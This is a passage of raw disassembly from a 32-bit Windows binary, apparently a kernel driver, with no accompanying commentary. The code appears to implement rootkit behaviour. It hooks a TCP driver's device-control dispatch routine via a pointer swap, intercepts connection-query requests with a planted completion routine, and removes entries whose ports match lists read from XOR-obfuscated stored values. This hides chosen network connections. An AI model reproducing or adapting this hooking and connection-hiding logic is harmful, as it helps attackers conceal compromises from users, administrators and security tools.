  402512:	c7 05 84 74 40 00 00 	movl   $0x0,0x407484
  402519:	00 00 00 
  40251c:	ff 15 74 60 40 00    	call   *0x406074
  402522:	6a 00                	push   $0x0
  402524:	68 6d 6b 70 6e       	push   $0x6e706b6d
  402529:	6a 34                	push   $0x34
  40252b:	6a 00                	push   $0x0
  40252d:	6a 00                	push   $0x0
  40252f:	b8 c4 73 40 00       	mov    $0x4073c4,%eax
  402534:	6a 00                	push   $0x0
  402536:	68 28 74 40 00       	push   $0x407428
  40253b:	a3 c8 73 40 00       	mov    %eax,0x4073c8
  402540:	a3 c4 73 40 00       	mov    %eax,0x4073c4
  402545:	ff d6                	call   *%esi
  402547:	6a 00                	push   $0x0
  402549:	68 30 22 40 00       	push   $0x402230
  40254e:	6a 00                	push   $0x0
  402550:	6a 00                	push   $0x0
  402552:	6a 00                	push   $0x0
  402554:	6a 00                	push   $0x0
  402556:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40255a:	50                   	push   %eax
  40255b:	ff 15 08 60 40 00    	call   *0x406008
  402561:	8b f0                	mov    %eax,%esi
  402563:	85 f6                	test   %esi,%esi
  402565:	7c 17                	jl     0x40257e
  402567:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40256b:	51                   	push   %ecx
  40256c:	ff 15 14 60 40 00    	call   *0x406014
  402572:	e8 79 fd ff ff       	call   0x4022f0
  402577:	e8 54 fe ff ff       	call   0x4023d0
  40257c:	8b c6                	mov    %esi,%eax
  40257e:	5e                   	pop    %esi
  40257f:	8b e5                	mov    %ebp,%esp
  402581:	5d                   	pop    %ebp
  402582:	c2 08 00             	ret    $0x8
  402585:	cc                   	int3
  402586:	cc                   	int3
  402587:	cc                   	int3
  402588:	cc                   	int3
  402589:	cc                   	int3
  40258a:	cc                   	int3
  40258b:	cc                   	int3
  40258c:	cc                   	int3
  40258d:	cc                   	int3
  40258e:	cc                   	int3
  40258f:	cc                   	int3
  402590:	51                   	push   %ecx
  402591:	55                   	push   %ebp
  402592:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  402596:	56                   	push   %esi
  402597:	8b 75 1c             	mov    0x1c(%ebp),%esi
  40259a:	57                   	push   %edi
  40259b:	8b 7d 60             	mov    0x60(%ebp),%edi
  40259e:	83 ef 24             	sub    $0x24,%edi
  4025a1:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  4025a5:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4025a9:	0f 8c 72 01 00 00    	jl     0x402721
  4025af:	8b 45 3c             	mov    0x3c(%ebp),%eax
  4025b2:	85 c0                	test   %eax,%eax
  4025b4:	0f 84 67 01 00 00    	je     0x402721
  4025ba:	85 f6                	test   %esi,%esi
  4025bc:	0f 84 5f 01 00 00    	je     0x402721
  4025c2:	50                   	push   %eax
  4025c3:	ff 15 80 60 40 00    	call   *0x406080
  4025c9:	84 c0                	test   %al,%al
  4025cb:	0f 84 50 01 00 00    	je     0x402721
  4025d1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4025d5:	8b 40 20             	mov    0x20(%eax),%eax
  4025d8:	53                   	push   %ebx
  4025d9:	3d 01 01 00 00       	cmp    $0x101,%eax
  4025de:	0f 85 99 00 00 00    	jne    0x40267d
  4025e4:	8b 5d 3c             	mov    0x3c(%ebp),%ebx
  4025e7:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  4025ec:	f7 e6                	mul    %esi
  4025ee:	8b f2                	mov    %edx,%esi
  4025f0:	c1 ee 04             	shr    $0x4,%esi
  4025f3:	33 ff                	xor    %edi,%edi
  4025f5:	85 f6                	test   %esi,%esi
  4025f7:	76 75                	jbe    0x40266e
  4025f9:	8d 6b 14             	lea    0x14(%ebx),%ebp
  4025fc:	8d 64 24 00          	lea    0x0(%esp),%esp
  402600:	8b 0d a4 84 40 00    	mov    0x4084a4,%ecx
  402606:	33 c0                	xor    %eax,%eax
  402608:	85 c9                	test   %ecx,%ecx
  40260a:	76 12                	jbe    0x40261e
  40260c:	8b 53 0c             	mov    0xc(%ebx),%edx
  40260f:	90                   	nop
  402610:	3b 14 85 a8 84 40 00 	cmp    0x4084a8(,%eax,4),%edx
  402617:	74 27                	je     0x402640
  402619:	40                   	inc    %eax
  40261a:	3b c1                	cmp    %ecx,%eax
  40261c:	72 f2                	jb     0x402610
  40261e:	8b 0d 38 86 40 00    	mov    0x408638,%ecx
  402624:	33 c0                	xor    %eax,%eax
  402626:	85 c9                	test   %ecx,%ecx
  402628:	76 35                	jbe    0x40265f
  40262a:	8b 53 10             	mov    0x10(%ebx),%edx
  40262d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402630:	3b 14 85 40 86 40 00 	cmp    0x408640(,%eax,4),%edx
  402637:	74 07                	je     0x402640
  402639:	40                   	inc    %eax
  40263a:	3b c1                	cmp    %ecx,%eax
  40263c:	72 f2                	jb     0x402630
  40263e:	eb 1f                	jmp    0x40265f
  402640:	8b c6                	mov    %esi,%eax
  402642:	2b c7                	sub    %edi,%eax
  402644:	48                   	dec    %eax
  402645:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  402648:	03 c9                	add    %ecx,%ecx
  40264a:	03 c9                	add    %ecx,%ecx
  40264c:	51                   	push   %ecx
  40264d:	55                   	push   %ebp
  40264e:	53                   	push   %ebx
  40264f:	e8 40 34 00 00       	call   0x405a94
  402654:	83 c4 0c             	add    $0xc,%esp
  402657:	4e                   	dec    %esi
  402658:	4f                   	dec    %edi
  402659:	83 eb 14             	sub    $0x14,%ebx
  40265c:	83 ed 14             	sub    $0x14,%ebp
  40265f:	47                   	inc    %edi
  402660:	83 c3 14             	add    $0x14,%ebx
  402663:	83 c5 14             	add    $0x14,%ebp
  402666:	3b fe                	cmp    %esi,%edi
  402668:	72 96                	jb     0x402600
  40266a:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  40266e:	8d 14 b6             	lea    (%esi,%esi,4),%edx
  402671:	03 d2                	add    %edx,%edx
  402673:	03 d2                	add    %edx,%edx
  402675:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402678:	e9 9f 00 00 00       	jmp    0x40271c
  40267d:	3d 02 01 00 00       	cmp    $0x102,%eax
  402682:	0f 85 98 00 00 00    	jne    0x402720
  402688:	8b 5d 3c             	mov    0x3c(%ebp),%ebx
  40268b:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  402690:	f7 e6                	mul    %esi
  402692:	8b f2                	mov    %edx,%esi
  402694:	c1 ee 04             	shr    $0x4,%esi
  402697:	33 ff                	xor    %edi,%edi
  402699:	85 f6                	test   %esi,%esi
  40269b:	76 73                	jbe    0x402710
  40269d:	8d 6b 18             	lea    0x18(%ebx),%ebp
  4026a0:	8b 0d a4 84 40 00    	mov    0x4084a4,%ecx
  4026a6:	33 c0                	xor    %eax,%eax
  4026a8:	85 c9                	test   %ecx,%ecx
  4026aa:	76 12                	jbe    0x4026be
  4026ac:	8b 53 0c             	mov    0xc(%ebx),%edx
  4026af:	90                   	nop
  4026b0:	3b 14 85 a8 84 40 00 	cmp    0x4084a8(,%eax,4),%edx
  4026b7:	74 27                	je     0x4026e0
  4026b9:	40                   	inc    %eax
  4026ba:	3b c1                	cmp    %ecx,%eax
  4026bc:	72 f2                	jb     0x4026b0
  4026be:	8b 0d 38 86 40 00    	mov    0x408638,%ecx
  4026c4:	33 c0                	xor    %eax,%eax
  4026c6:	85 c9                	test   %ecx,%ecx
  4026c8:	76 37                	jbe    0x402701
  4026ca:	8b 53 10             	mov    0x10(%ebx),%edx
  4026cd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4026d0:	3b 14 85 40 86 40 00 	cmp    0x408640(,%eax,4),%edx
  4026d7:	74 07                	je     0x4026e0
  4026d9:	40                   	inc    %eax
  4026da:	3b c1                	cmp    %ecx,%eax
  4026dc:	72 f2                	jb     0x4026d0
  4026de:	eb 21                	jmp    0x402701
  4026e0:	8b c6                	mov    %esi,%eax
  4026e2:	2b c7                	sub    %edi,%eax
  4026e4:	48                   	dec    %eax
  4026e5:	8d 04 40             	lea    (%eax,%eax,2),%eax
  4026e8:	03 c0                	add    %eax,%eax
  4026ea:	03 c0                	add    %eax,%eax
  4026ec:	03 c0                	add    %eax,%eax
  4026ee:	50                   	push   %eax
  4026ef:	55                   	push   %ebp
  4026f0:	53                   	push   %ebx
  4026f1:	e8 9e 33 00 00       	call   0x405a94
  4026f6:	83 c4 0c             	add    $0xc,%esp
  4026f9:	4e                   	dec    %esi
  4026fa:	4f                   	dec    %edi
  4026fb:	83 eb 18             	sub    $0x18,%ebx
  4026fe:	83 ed 18             	sub    $0x18,%ebp
  402701:	47                   	inc    %edi
  402702:	83 c3 18             	add    $0x18,%ebx
  402705:	83 c5 18             	add    $0x18,%ebp
  402708:	3b fe                	cmp    %esi,%edi
  40270a:	72 94                	jb     0x4026a0
  40270c:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  402710:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  402713:	03 c9                	add    %ecx,%ecx
  402715:	03 c9                	add    %ecx,%ecx
  402717:	03 c9                	add    %ecx,%ecx
  402719:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  40271c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402720:	5b                   	pop    %ebx
  402721:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402725:	8b 50 04             	mov    0x4(%eax),%edx
  402728:	89 57 20             	mov    %edx,0x20(%edi)
  40272b:	8b 08                	mov    (%eax),%ecx
  40272d:	6a 00                	push   $0x0
  40272f:	50                   	push   %eax
  402730:	89 4f 1c             	mov    %ecx,0x1c(%edi)
  402733:	ff 15 28 61 40 00    	call   *0x406128
  402739:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40273d:	80 78 08 00          	cmpb   $0x0,0x8(%eax)
  402741:	74 13                	je     0x402756
  402743:	8b 54 24 14          	mov    0x14(%esp),%edx
  402747:	50                   	push   %eax
  402748:	8b 47 1c             	mov    0x1c(%edi),%eax
  40274b:	55                   	push   %ebp
  40274c:	52                   	push   %edx
  40274d:	ff d0                	call   *%eax
  40274f:	5f                   	pop    %edi
  402750:	5e                   	pop    %esi
  402751:	5d                   	pop    %ebp
  402752:	59                   	pop    %ecx
  402753:	c2 0c 00             	ret    $0xc
  402756:	80 7d 21 00          	cmpb   $0x0,0x21(%ebp)
  40275a:	74 07                	je     0x402763
  40275c:	8b 6d 60             	mov    0x60(%ebp),%ebp
  40275f:	80 4d 03 01          	orb    $0x1,0x3(%ebp)
  402763:	5f                   	pop    %edi
  402764:	5e                   	pop    %esi
  402765:	33 c0                	xor    %eax,%eax
  402767:	5d                   	pop    %ebp
  402768:	59                   	pop    %ecx
  402769:	c2 0c 00             	ret    $0xc
  40276c:	cc                   	int3
  40276d:	cc                   	int3
  40276e:	cc                   	int3
  40276f:	cc                   	int3
  402770:	83 ec 24             	sub    $0x24,%esp
  402773:	53                   	push   %ebx
  402774:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  402778:	56                   	push   %esi
  402779:	8b 73 60             	mov    0x60(%ebx),%esi
  40277c:	81 7e 0c 03 00 12 00 	cmpl   $0x120003,0xc(%esi)
  402783:	0f 85 4c 01 00 00    	jne    0x4028d5
  402789:	83 7e 08 24          	cmpl   $0x24,0x8(%esi)
  40278d:	0f 85 42 01 00 00    	jne    0x4028d5
  402793:	8b 4e 10             	mov    0x10(%esi),%ecx
  402796:	8d 44 24 08          	lea    0x8(%esp),%eax
  40279a:	57                   	push   %edi
  40279b:	8b f8                	mov    %eax,%edi
  40279d:	c7 44 24 0c 00 04 00 	movl   $0x400,0xc(%esp)
  4027a4:	00 
  4027a5:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4027ac:	00 
  4027ad:	c7 44 24 14 00 02 00 	movl   $0x200,0x14(%esp)
  4027b4:	00 
  4027b5:	c7 44 24 18 00 01 00 	movl   $0x100,0x18(%esp)
  4027bc:	00 
  4027bd:	c7 44 24 1c 01 01 00 	movl   $0x101,0x1c(%esp)
  4027c4:	00 
  4027c5:	ba 14 00 00 00       	mov    $0x14,%edx
  4027ca:	2b cf                	sub    %edi,%ecx
  4027cc:	8d 64 24 00          	lea    0x0(%esp),%esp
  4027d0:	8b 3c 01             	mov    (%ecx,%eax,1),%edi
  4027d3:	3b 38                	cmp    (%eax),%edi
  4027d5:	75 6b                	jne    0x402842
  4027d7:	83 ea 04             	sub    $0x4,%edx
  4027da:	83 c0 04             	add    $0x4,%eax
  4027dd:	83 fa 04             	cmp    $0x4,%edx
  4027e0:	73 ee                	jae    0x4027d0
  4027e2:	68 31 67 61 54       	push   $0x54616731
  4027e7:	6a 34                	push   $0x34
  4027e9:	6a 00                	push   $0x0
  4027eb:	ff 15 98 60 40 00    	call   *0x406098
  4027f1:	8b f8                	mov    %eax,%edi
  4027f3:	8b 46 1c             	mov    0x1c(%esi),%eax
  4027f6:	89 07                	mov    %eax,(%edi)
  4027f8:	8b 4e 20             	mov    0x20(%esi),%ecx
  4027fb:	89 4f 04             	mov    %ecx,0x4(%edi)
  4027fe:	c7 46 1c 90 25 40 00 	movl   $0x402590,0x1c(%esi)
  402805:	89 7e 20             	mov    %edi,0x20(%esi)
  402808:	ff 15 a8 60 40 00    	call   *0x4060a8
  40280e:	89 47 0c             	mov    %eax,0xc(%edi)
  402811:	8b 46 10             	mov    0x10(%esi),%eax
  402814:	8b 10                	mov    (%eax),%edx
  402816:	89 57 10             	mov    %edx,0x10(%edi)
  402819:	8b 48 04             	mov    0x4(%eax),%ecx
  40281c:	89 4f 14             	mov    %ecx,0x14(%edi)
  40281f:	8b 50 08             	mov    0x8(%eax),%edx
  402822:	89 57 18             	mov    %edx,0x18(%edi)
  402825:	8b 48 0c             	mov    0xc(%eax),%ecx
  402828:	89 4f 1c             	mov    %ecx,0x1c(%edi)
  40282b:	8b 50 10             	mov    0x10(%eax),%edx
  40282e:	89 57 20             	mov    %edx,0x20(%edi)
  402831:	8a 46 03             	mov    0x3(%esi),%al
  402834:	24 40                	and    $0x40,%al
  402836:	3c 40                	cmp    $0x40,%al
  402838:	0f 94 c1             	sete   %cl
  40283b:	88 4f 08             	mov    %cl,0x8(%edi)
  40283e:	80 4e 03 40          	orb    $0x40,0x3(%esi)
  402842:	8b 56 10             	mov    0x10(%esi),%edx
  402845:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402849:	8b f8                	mov    %eax,%edi
  40284b:	c7 44 24 1c 02 01 00 	movl   $0x102,0x1c(%esp)
  402852:	00 
  402853:	b9 14 00 00 00       	mov    $0x14,%ecx
  402858:	2b d7                	sub    %edi,%edx
  40285a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402860:	8b 3c 02             	mov    (%edx,%eax,1),%edi
  402863:	3b 38                	cmp    (%eax),%edi
  402865:	75 6d                	jne    0x4028d4
  402867:	83 e9 04             	sub    $0x4,%ecx
  40286a:	83 c0 04             	add    $0x4,%eax
  40286d:	83 f9 04             	cmp    $0x4,%ecx
  402870:	73 ee                	jae    0x402860
  402872:	68 31 67 61 54       	push   $0x54616731
  402877:	6a 34                	push   $0x34
  402879:	6a 00                	push   $0x0
  40287b:	ff 15 98 60 40 00    	call   *0x406098
  402881:	8b 56 1c             	mov    0x1c(%esi),%edx
  402884:	8b f8                	mov    %eax,%edi
  402886:	89 17                	mov    %edx,(%edi)
  402888:	8b 46 20             	mov    0x20(%esi),%eax
  40288b:	89 47 04             	mov    %eax,0x4(%edi)
  40288e:	c7 46 1c 90 25 40 00 	movl   $0x402590,0x1c(%esi)
  402895:	89 7e 20             	mov    %edi,0x20(%esi)
  402898:	ff 15 a8 60 40 00    	call   *0x4060a8
  40289e:	89 47 0c             	mov    %eax,0xc(%edi)
  4028a1:	8b 46 10             	mov    0x10(%esi),%eax
  4028a4:	8b 08                	mov    (%eax),%ecx
  4028a6:	89 4f 10             	mov    %ecx,0x10(%edi)
  4028a9:	8b 50 04             	mov    0x4(%eax),%edx
  4028ac:	89 57 14             	mov    %edx,0x14(%edi)
  4028af:	8b 48 08             	mov    0x8(%eax),%ecx
  4028b2:	89 4f 18             	mov    %ecx,0x18(%edi)
  4028b5:	8b 50 0c             	mov    0xc(%eax),%edx
  4028b8:	89 57 1c             	mov    %edx,0x1c(%edi)
  4028bb:	8b 40 10             	mov    0x10(%eax),%eax
  4028be:	89 47 20             	mov    %eax,0x20(%edi)
  4028c1:	8a 4e 03             	mov    0x3(%esi),%cl
  4028c4:	80 e1 40             	and    $0x40,%cl
  4028c7:	80 f9 40             	cmp    $0x40,%cl
  4028ca:	0f 94 c2             	sete   %dl
  4028cd:	88 57 08             	mov    %dl,0x8(%edi)
  4028d0:	80 4e 03 40          	orb    $0x40,0x3(%esi)
  4028d4:	5f                   	pop    %edi
  4028d5:	8b 44 24 30          	mov    0x30(%esp),%eax
  4028d9:	53                   	push   %ebx
  4028da:	50                   	push   %eax
  4028db:	ff 15 d0 87 40 00    	call   *0x4087d0
  4028e1:	5e                   	pop    %esi
  4028e2:	5b                   	pop    %ebx
  4028e3:	83 c4 24             	add    $0x24,%esp
  4028e6:	c2 08 00             	ret    $0x8
  4028e9:	cc                   	int3
  4028ea:	cc                   	int3
  4028eb:	cc                   	int3
  4028ec:	cc                   	int3
  4028ed:	cc                   	int3
  4028ee:	cc                   	int3
  4028ef:	cc                   	int3
  4028f0:	81 ec ac 09 00 00    	sub    $0x9ac,%esp
  4028f6:	53                   	push   %ebx
  4028f7:	55                   	push   %ebp
  4028f8:	56                   	push   %esi
  4028f9:	57                   	push   %edi
  4028fa:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  4028ff:	be 60 63 40 00       	mov    $0x406360,%esi
  402904:	8d 7c 24 48          	lea    0x48(%esp),%edi
  402908:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40290a:	33 db                	xor    %ebx,%ebx
  40290c:	8d 44 24 48          	lea    0x48(%esp),%eax
  402910:	50                   	push   %eax
  402911:	53                   	push   %ebx
  402912:	88 5c 24 1f          	mov    %bl,0x1f(%esp)
  402916:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  402918:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  40291c:	89 1d a4 84 40 00    	mov    %ebx,0x4084a4
  402922:	89 1d 38 86 40 00    	mov    %ebx,0x408638
  402928:	ff 15 9c 60 40 00    	call   *0x40609c
  40292e:	85 c0                	test   %eax,%eax
  402930:	0f 8c c7 01 00 00    	jl     0x402afd
  402936:	8b 2d 18 60 40 00    	mov    0x406018,%ebp
  40293c:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  402940:	51                   	push   %ecx
  402941:	8d 54 24 44          	lea    0x44(%esp),%edx
  402945:	52                   	push   %edx
  402946:	ff d5                	call   *%ebp
  402948:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  40294c:	51                   	push   %ecx
  40294d:	6a 01                	push   $0x1
  40294f:	8d 54 24 20          	lea    0x20(%esp),%edx
  402953:	8d 44 24 48          	lea    0x48(%esp),%eax
  402957:	52                   	push   %edx
  402958:	c7 44 24 34 18 00 00 	movl   $0x18,0x34(%esp)
  40295f:	00 
  402960:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  402964:	c7 44 24 40 40 00 00 	movl   $0x40,0x40(%esp)
  40296b:	00 
  40296c:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  402970:	89 5c 24 44          	mov    %ebx,0x44(%esp)
  402974:	89 5c 24 48          	mov    %ebx,0x48(%esp)
  402978:	ff 15 ac 60 40 00    	call   *0x4060ac
  40297e:	85 c0                	test   %eax,%eax
  402980:	0f 8c 77 01 00 00    	jl     0x402afd
  402986:	68 00 01 00 00       	push   $0x100
  40298b:	8d 84 24 bc 00 00 00 	lea    0xbc(%esp),%eax
  402992:	53                   	push   %ebx
  402993:	50                   	push   %eax
  402994:	e8 e3 30 00 00       	call   0x405a7c
  402999:	68 00 08 00 00       	push   $0x800
  40299e:	8d 8c 24 c8 01 00 00 	lea    0x1c8(%esp),%ecx
  4029a5:	53                   	push   %ebx
  4029a6:	51                   	push   %ecx
  4029a7:	e8 d0 30 00 00       	call   0x405a7c
  4029ac:	68 cc 63 40 00       	push   $0x4063cc
  4029b1:	b8 00 01 00 00       	mov    $0x100,%eax
  4029b6:	8d 9c 24 d4 00 00 00 	lea    0xd4(%esp),%ebx
  4029bd:	e8 3e e6 ff ff       	call   0x401000
  4029c2:	83 c4 1c             	add    $0x1c,%esp
  4029c5:	8b d3                	mov    %ebx,%edx
  4029c7:	52                   	push   %edx
  4029c8:	8d 44 24 24          	lea    0x24(%esp),%eax
  4029cc:	50                   	push   %eax
  4029cd:	ff d5                	call   *%ebp
  4029cf:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4029d3:	51                   	push   %ecx
  4029d4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4029d8:	68 00 10 00 00       	push   $0x1000
  4029dd:	8d 94 24 c0 01 00 00 	lea    0x1c0(%esp),%edx
  4029e4:	52                   	push   %edx
  4029e5:	6a 02                	push   $0x2
  4029e7:	8d 44 24 30          	lea    0x30(%esp),%eax
  4029eb:	50                   	push   %eax
  4029ec:	51                   	push   %ecx
  4029ed:	ff 15 a4 60 40 00    	call   *0x4060a4
  4029f3:	85 c0                	test   %eax,%eax
  4029f5:	0f 8c 00 01 00 00    	jl     0x402afb
  4029fb:	33 f6                	xor    %esi,%esi
  4029fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  402a00:	8d 7e 01             	lea    0x1(%esi),%edi
  402a03:	57                   	push   %edi
  402a04:	68 d4 63 40 00       	push   $0x4063d4
  402a09:	b8 00 01 00 00       	mov    $0x100,%eax
  402a0e:	8d 9c 24 c0 00 00 00 	lea    0xc0(%esp),%ebx
  402a15:	e8 e6 e5 ff ff       	call   0x401000
  402a1a:	83 c4 08             	add    $0x8,%esp
  402a1d:	8b d3                	mov    %ebx,%edx
  402a1f:	52                   	push   %edx
  402a20:	8d 44 24 24          	lea    0x24(%esp),%eax
  402a24:	50                   	push   %eax
  402a25:	ff d5                	call   *%ebp
  402a27:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402a2b:	51                   	push   %ecx
  402a2c:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402a30:	68 00 10 00 00       	push   $0x1000
  402a35:	8d 94 24 c0 01 00 00 	lea    0x1c0(%esp),%edx
  402a3c:	52                   	push   %edx
  402a3d:	6a 02                	push   $0x2
  402a3f:	8d 44 24 30          	lea    0x30(%esp),%eax
  402a43:	50                   	push   %eax
  402a44:	51                   	push   %ecx
  402a45:	ff 15 a4 60 40 00    	call   *0x4060a4
  402a4b:	85 c0                	test   %eax,%eax
  402a4d:	7c 2a                	jl     0x402a79
  402a4f:	8b 94 24 c4 01 00 00 	mov    0x1c4(%esp),%edx
  402a56:	81 f2 b7 61 2d ae    	xor    $0xae2d61b7,%edx
  402a5c:	b8 01 00 00 00       	mov    $0x1,%eax
  402a61:	01 05 a4 84 40 00    	add    %eax,0x4084a4
  402a67:	89 14 b5 a8 84 40 00 	mov    %edx,0x4084a8(,%esi,4)
  402a6e:	8b f7                	mov    %edi,%esi
  402a70:	83 fe 64             	cmp    $0x64,%esi
  402a73:	88 44 24 17          	mov    %al,0x17(%esp)
  402a77:	7c 87                	jl     0x402a00
  402a79:	33 f6                	xor    %esi,%esi
  402a7b:	eb 03                	jmp    0x402a80
  402a7d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402a80:	8d 7e 01             	lea    0x1(%esi),%edi
  402a83:	57                   	push   %edi
  402a84:	68 e0 63 40 00       	push   $0x4063e0
  402a89:	b8 00 01 00 00       	mov    $0x100,%eax
  402a8e:	8d 9c 24 c0 00 00 00 	lea    0xc0(%esp),%ebx
  402a95:	e8 66 e5 ff ff       	call   0x401000
  402a9a:	83 c4 08             	add    $0x8,%esp
  402a9d:	8b c3                	mov    %ebx,%eax
  402a9f:	50                   	push   %eax
  402aa0:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402aa4:	51                   	push   %ecx
  402aa5:	ff d5                	call   *%ebp
  402aa7:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402aab:	52                   	push   %edx
  402aac:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402ab0:	68 00 10 00 00       	push   $0x1000
  402ab5:	8d 84 24 c0 01 00 00 	lea    0x1c0(%esp),%eax
  402abc:	50                   	push   %eax
  402abd:	6a 02                	push   $0x2
  402abf:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402ac3:	51                   	push   %ecx
  402ac4:	52                   	push   %edx
  402ac5:	ff 15 a4 60 40 00    	call   *0x4060a4
  402acb:	85 c0                	test   %eax,%eax
  402acd:	7c 2c                	jl     0x402afb
  402acf:	66 8b 84 24 c4 01 00 	mov    0x1c4(%esp),%ax
  402ad6:	00 
  402ad7:	66 c1 c0 08          	rol    $0x8,%ax
  402adb:	0f b7 c8             	movzwl %ax,%ecx
  402ade:	b8 01 00 00 00       	mov    $0x1,%eax
  402ae3:	01 05 38 86 40 00    	add    %eax,0x408638
  402ae9:	89 0c b5 40 86 40 00 	mov    %ecx,0x408640(,%esi,4)
  402af0:	8b f7                	mov    %edi,%esi
  402af2:	83 fe 64             	cmp    $0x64,%esi
  402af5:	88 44 24 17          	mov    %al,0x17(%esp)
  402af9:	7c 85                	jl     0x402a80
  402afb:	33 db                	xor    %ebx,%ebx
  402afd:	8b 44 24 18          	mov    0x18(%esp),%eax
  402b01:	3b c3                	cmp    %ebx,%eax
  402b03:	74 07                	je     0x402b0c
  402b05:	50                   	push   %eax
  402b06:	ff 15 14 60 40 00    	call   *0x406014
  402b0c:	33 c0                	xor    %eax,%eax
  402b0e:	38 5c 24 17          	cmp    %bl,0x17(%esp)
  402b12:	5f                   	pop    %edi
  402b13:	0f 95 c0             	setne  %al
  402b16:	5e                   	pop    %esi
  402b17:	5d                   	pop    %ebp
  402b18:	5b                   	pop    %ebx
  402b19:	48                   	dec    %eax
  402b1a:	25 01 00 00 c0       	and    $0xc0000001,%eax
  402b1f:	81 c4 ac 09 00 00    	add    $0x9ac,%esp
  402b25:	c3                   	ret
  402b26:	cc                   	int3
  402b27:	cc                   	int3
  402b28:	cc                   	int3
  402b29:	cc                   	int3
  402b2a:	cc                   	int3
  402b2b:	cc                   	int3
  402b2c:	cc                   	int3
  402b2d:	cc                   	int3
  402b2e:	cc                   	int3
  402b2f:	cc                   	int3
  402b30:	55                   	push   %ebp
  402b31:	8b ec                	mov    %esp,%ebp
  402b33:	83 e4 f8             	and    $0xfffffff8,%esp
  402b36:	83 ec 14             	sub    $0x14,%esp
  402b39:	56                   	push   %esi
  402b3a:	c7 44 24 10 80 0f 05 	movl   $0xfd050f80,0x10(%esp)
  402b41:	fd 
  402b42:	c7 44 24 14 ff ff ff 	movl   $0xffffffff,0x14(%esp)
  402b49:	ff 
  402b4a:	e8 a1 fd ff ff       	call   0x4028f0
  402b4f:	85 c0                	test   %eax,%eax
  402b51:	7d 21                	jge    0x402b74
  402b53:	8b 35 a0 60 40 00    	mov    0x4060a0,%esi
  402b59:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402b60:	8d 44 24 10          	lea    0x10(%esp),%eax
  402b64:	50                   	push   %eax
  402b65:	6a 00                	push   $0x0
  402b67:	6a 00                	push   $0x0
  402b69:	ff d6                	call   *%esi
  402b6b:	e8 80 fd ff ff       	call   0x4028f0
  402b70:	85 c0                	test   %eax,%eax
  402b72:	7c ec                	jl     0x402b60
  402b74:	8b 35 18 60 40 00    	mov    0x406018,%esi
  402b7a:	68 ec 63 40 00       	push   $0x4063ec
  402b7f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402b83:	51                   	push   %ecx
  402b84:	ff d6                	call   *%esi
  402b86:	8b 15 6c 60 40 00    	mov    0x40606c,%edx
  402b8c:	8b 02                	mov    (%edx),%eax
  402b8e:	68 3c 86 40 00       	push   $0x40863c
  402b93:	6a 00                	push   $0x0
  402b95:	6a 00                	push   $0x0
  402b97:	50                   	push   %eax
  402b98:	6a 00                	push   $0x0
  402b9a:	6a 00                	push   $0x0
  402b9c:	6a 40                	push   $0x40
  402b9e:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402ba2:	51                   	push   %ecx
  402ba3:	e8 c2 2e 00 00       	call   0x405a6a
  402ba8:	85 c0                	test   %eax,%eax
  402baa:	7d 3b                	jge    0x402be7
  402bac:	68 08 64 40 00       	push   $0x406408
  402bb1:	8d 54 24 0c          	lea    0xc(%esp),%edx
  402bb5:	52                   	push   %edx
  402bb6:	ff d6                	call   *%esi
  402bb8:	68 d8 87 40 00       	push   $0x4087d8
  402bbd:	68 d4 87 40 00       	push   $0x4087d4
  402bc2:	68 ff 01 1f 00       	push   $0x1f01ff
  402bc7:	8d 44 24 14          	lea    0x14(%esp),%eax
  402bcb:	50                   	push   %eax
  402bcc:	ff 15 70 60 40 00    	call   *0x406070
  402bd2:	85 c0                	test   %eax,%eax
  402bd4:	7c 31                	jl     0x402c07
  402bd6:	8b 0d d4 87 40 00    	mov    0x4087d4,%ecx
  402bdc:	8b 51 04             	mov    0x4(%ecx),%edx
  402bdf:	8b 42 08             	mov    0x8(%edx),%eax
  402be2:	a3 3c 86 40 00       	mov    %eax,0x40863c
  402be7:	a1 3c 86 40 00       	mov    0x40863c,%eax
  402bec:	8b 48 70             	mov    0x70(%eax),%ecx
  402bef:	83 c0 70             	add    $0x70,%eax
  402bf2:	89 0d d0 87 40 00    	mov    %ecx,0x4087d0
  402bf8:	ba 70 27 40 00       	mov    $0x402770,%edx
  402bfd:	87 10                	xchg   %edx,(%eax)
  402bff:	6a 00                	push   $0x0
